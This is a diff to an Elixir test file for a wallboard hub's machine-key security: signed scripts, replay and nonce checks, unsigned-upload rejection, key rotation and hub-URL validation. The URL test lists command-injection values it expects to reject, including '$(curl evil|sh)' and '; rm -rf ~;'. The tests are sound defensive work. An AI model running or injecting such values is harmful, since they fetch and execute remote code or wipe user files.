@@ -228,7 +228,12 @@ defmodule Wallboard.MachineKeysTest do
         {out, 0} = System.cmd("curl", ["-s", "-D", "-", "#{ctx.url}/ingest/#{name}"])
         [head, body] = String.split(out, "\r\n\r\n", parts: 2)
         [_, sig] = Regex.run(~r/x-vitalaize-script-signature: ([0-9a-f]{64})/i, head)
-        assert sig == MachineKeys.hmac(MachineKeys.connect_key(), "vitalaize script\n" <> body)
+        # Its name is signed too, so one script cannot be sent for another.
+        assert sig ==
+                 MachineKeys.hmac(
+                   MachineKeys.connect_key(),
+                   "vitalaize script\n#{name}\n" <> body
+                 )
       end
     end
 
@@ -305,26 +310,29 @@ defmodule Wallboard.MachineKeysTest do
       |> Plug.Conn.put_req_header("x-vitalaize-signature", sig)
     end
 
-    test "a request whose body comes after its time ran out is refused, so it cannot be sent twice" do
+    test "a copy of a request is refused before its body is read, however slowly either comes" do
       dir = tmp_dir()
       hub(dir)
       {id, key} = Fixtures.connect_machine(Path.join(dir, "a"), "laptop")
       t = System.os_time(:second)
       conn = signed_conn("/ingest/status?machine=laptop", "{}", id, key, to_string(t))
 
-      # Sent in time: taken once, then refused as sent before.
+      # The nonce is claimed with the headers, on the database's own clock.
       assert {:ok, parts} = MachineKeys.precheck(conn, t)
-      assert MachineKeys.verify(conn, parts, "{}", t) == {:ok, "laptop"}
+      assert {:error, 401, "this request was already sent once"} = MachineKeys.precheck(conn, t)
 
-      assert {:error, 401, "this request was already sent once"} =
-               MachineKeys.verify(conn, parts, "{}", t)
+      # A body that comes long after its headers is still taken: a slow
+      # network is not refused for being slow.
+      assert MachineKeys.verify(conn, parts, "{}", t + 900) == {:ok, "laptop"}
 
-      # Its headers again just inside the window, its body just after: by
-      # then the first one's nonce is forgotten, so the time is what stops it.
-      assert {:ok, parts} = MachineKeys.precheck(conn, t + 295)
+      # And one signed more than five minutes ago is refused, whatever the
+      # caller's own idea of the time.
+      old = signed_conn("/ingest/status?machine=laptop", "{}", id, key, to_string(t - 301))
 
       assert {:error, 401, "request time is more than 5 minutes" <> _} =
-               MachineKeys.verify(conn, parts, "{}", t + 305)
+               MachineKeys.precheck(old, t - 290)
+
+      assert Store.claim_nonce(id, "fedcba9876543210", t - 301, MachineKeys.window()) == :stale
     end
 
     test "a machine disconnected while its upload is on the way is refused" do
@@ -386,23 +394,38 @@ defmodule Wallboard.MachineKeysTest do
       assert [%{key_id: ^victim, machine: "victim"}] = MachineKeys.list()
     end
 
-    test "only two uploads are read at once; the next is turned away to come again" do
+    test "an upload with a wrong signature is never read into memory, and leaves no file" do
       dir = tmp_dir()
       url = hub(dir)
-      {id, key} = Fixtures.connect_machine(Path.join(dir, "a"), "laptop")
-      slots = Ingest.upload_slots()
-      :atomics.put(slots, 1, 2)
-      on_exit(fn -> :atomics.put(slots, 1, 0) end)
+      {id, _} = Fixtures.connect_machine(Path.join(dir, "a"), "laptop")
+      tmp = System.tmp_dir!()
+      before = tmp |> File.ls!() |> Enum.filter(&String.starts_with?(&1, "wallboard-upload-"))
 
-      assert {"503", "the hub is busy with other uploads" <> _} =
-               Fixtures.signed_post(url, "/ingest/transcript?machine=laptop", "x", id, key)
+      assert {"401", "wrong signature"} =
+               Fixtures.signed_post(
+                 url,
+                 "/ingest/transcript?machine=laptop",
+                 :binary.copy("x", 3_000_000),
+                 id,
+                 String.duplicate("0", 64)
+               )
 
-      :atomics.put(slots, 1, 0)
+      after_ = tmp |> File.ls!() |> Enum.filter(&String.starts_with?(&1, "wallboard-upload-"))
+      assert after_ -- before == []
+    end
 
-      assert {"422", "not a .tar.gz"} =
-               Fixtures.signed_post(url, "/ingest/transcript?machine=laptop", "x", id, key)
+    test "a connect request with a body is refused" do
+      dir = tmp_dir()
+      url = hub(dir)
 
-      assert :atomics.get(slots, 1) == 0
+      assert {"413", "a connect request has no body"} =
+               Fixtures.signed_post(
+                 url,
+                 "/ingest/connect?machine=x&key=#{String.duplicate("c", 32)}",
+                 "some body",
+                 "connect",
+                 MachineKeys.connect_key()
+               )
     end
   end
 
@@ -471,6 +494,53 @@ defmodule Wallboard.MachineKeysTest do
       refute SettingsLive.install_command("http://hub:4747", "abc") =~ MachineKeys.connect_key()
     end
 
+    test "a new connect key disconnects every machine, since its old one may have been seen" do
+      dir = tmp_dir()
+      hub(dir)
+      Fixtures.connect_machine(Path.join(dir, "a"), "laptop")
+      Fixtures.connect_machine(Path.join(dir, "b"), "desk")
+      old = MachineKeys.connect_key()
+
+      {:noreply, socket} = SettingsLive.handle_event("new_key", %{}, page())
+      assert length(MachineKeys.list()) == 2
+      {:noreply, socket} = SettingsLive.handle_event("new_key", %{}, socket)
+
+      assert MachineKeys.list() == []
+      assert MachineKeys.connect_key() != old
+      assert socket.assigns.notice =~ "every machine disconnected"
+    end
+
+    test "the hub address takes only a plain address, and only this Mac may change it" do
+      dir = tmp_dir()
+      hub(dir)
+
+      for bad <- [
+            "http://h:4747/$(curl evil|sh)",
+            ~s(http://h:4747"; rm -rf ~; "),
+            "http://h:4747\nexit",
+            "http://h:4747/x",
+            "ftp://h"
+          ] do
+        refute Settings.hub_url?(bad), bad
+      end
+
+      for good <- ["http://192.168.1.20:4747", "https://hub.local", "http://[fe80::1]:4747/"] do
+        assert Settings.hub_url?(good), good
+      end
+
+      socket = page(false)
+      values = Map.put(socket.assigns.values, "archive.hub_url", "http://10.0.0.9:4747")
+      # What the page saves, kept in the database.
+      saved = fn -> Store.get_meta("settings_overrides") || "" end
+      {:noreply, _} = SettingsLive.handle_event("save", %{"s" => values}, socket)
+      refute saved.() =~ "10.0.0.9"
+
+      socket = page(true)
+      values = Map.put(socket.assigns.values, "archive.hub_url", "http://10.0.0.9:4747")
+      {:noreply, _} = SettingsLive.handle_event("save", %{"s" => values}, socket)
+      assert saved.() =~ "http://10.0.0.9:4747"
+    end
+
     test "another device, even with the board's password, cannot see the key or disconnect" do
       dir = tmp_dir()
       hub(dir)
@@ -487,6 +557,9 @@ defmodule Wallboard.MachineKeysTest do
 
       page = html(socket)
       assert page =~ "Open this page on the Mac that runs the board"
+      # Not even the command: coming over plain http, its check could have
+      # been changed on the way.
+      refute page =~ "/ingest/install.sh"
       refute page =~ ~s(phx-click="disconnect")
       refute page =~ MachineKeys.connect_key()
     end
